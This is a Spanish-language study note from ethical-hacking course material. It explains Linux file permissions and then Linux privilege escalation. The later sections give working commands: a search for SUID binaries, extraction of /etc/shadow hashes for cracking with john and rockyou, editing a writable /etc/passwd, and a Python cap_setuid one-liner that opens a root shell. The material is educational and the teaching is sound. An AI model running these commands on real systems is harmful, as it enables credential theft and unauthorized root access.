# Lectura de permisos
<p align="center">
  <img width="650" height="325" src="https://raw.githubusercontent.com/w0lfst/Apuntes-Hacking-Etico/main/assets/images/permisos.png">
</p>

> `X` Fichero: ejecutable | directorio: atravesar (cd) 
***
## Permisos formato decimal

|rwx | r-x |r-x |
|---|---|---|
|7|5|5|
- 7 = 1+2+4
- 5 = 1+4
- 5 = 1+4

La posicion se cuenta desde la derecha:
- x > 1
- w > 2
- r > 4

> Todo esta convertido de binario a decimal. Para saber como convertir mira el siguiente punto.

### Convertir de binario a decimal

|r-x | r-- |-w- |
|---|---|---|
|101|100|010|
|5|4|2|

Contar la posicion desde la derecha 0 1 2 
- Solo operamos con las posiciones que tengan un 1.
- Elevamos 2 a cada posicion:
  - 2^0 + 2^2 = 1 + 4 = 5
  - 2^2 = 4
  - 2^1 = 2

***
## Permisos avanzados

```bash
chattr +i -V fichero.txt
```
- `+i` Añadir flag que impide borrar el fichero hasta al usuario **root**.
- `-V` Muestra todo lo que realiza el comando.

> Ver los permisos especiales `lsattr` 

***

## Explotación permisos SUID
1. Asignar un permiso SUID, por ejemplo, el comando find es 755, con chmod añadimos un 4 al permiso del archivo

```bash
chmod 4755 /usr/bin/find
```

2. Con el comando `id` podemos ver los permisos SUID que tenemos.
3. Buscariamos en [GTFOBins](https://gtfobins.github.io/) el permiso que tenemos, en este caso, find. 

## Explotacion permisos

Buscar permisos SUID: 
```bash
find \-perm -4000  2>/dev/null 
```

Para evitar que salgan errores en el escaneo:
1. En bash el error se gestiona a trave del numero 2.
2. Redirigimos el error a /dev/null → 2>/dev/null 
		
Buscar archivos con permisos de escritura: 
```bash
find \-writable 2>/dev/null 
```
### Ejemplos ataque:
Si tenemos permiso para ver el archivo shadows podremos ver las contraseñas de los usuarios hasheadas en un formato sha-512.
> Comprobamos el tipo de hash con `cat /etc/login.defs | grep "ENCRYPT_METHOD"`


1. Desencriptaremos las contraseñas por fuerza bruta, por ejemplo con el diccionario rockyou.
2. Exportamos el hash:
```bash
cat /etc/shadow | grep "user" > hash
```
4. Crackemos:
```bash
john --wordlist=/usr/share/wordlists/rockyou hash 
```
6. Ver contraseña:
```bash
john --show hash
```

Si tenemos permiso de escritura en /etc/passwd:

1. Nos creamos una contraseña:
```bash
openssl nueva-contraseña
```
4. Veremos un hash y lo copiamos.
5. Con hash y hashid podemos saber en que formato esta hecho.
6. Modificamos el /etc/passwd y ponemos el hash que hemos generado para asi loguearnos como ese usuario con la contraseña creada anteriormente.

## Capabilities

Asignaremos un capabilite para realizar la prueba:
```bash
setcap cap_setuid+ep /usr/bin/python3.9
```
En este caso estamos asignando una capabilitie de tipo setuid, podemos ver mas tipos [aqui](https://wiki.gentoo.org/wiki/Hardened/Overview_of_POSIX_capabilities).

Para obtener las capabilities que tenemos asignadas actualmente:
```bash
cd /
getcap -r / 2>/dev/null
```

En este caso encontraremos una capabilitie de python tipo `cap_setuid+ep`.  
Aprovecharemos esta capabilitie para lanzarnos una bash con privilegios de root:
```bash
python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

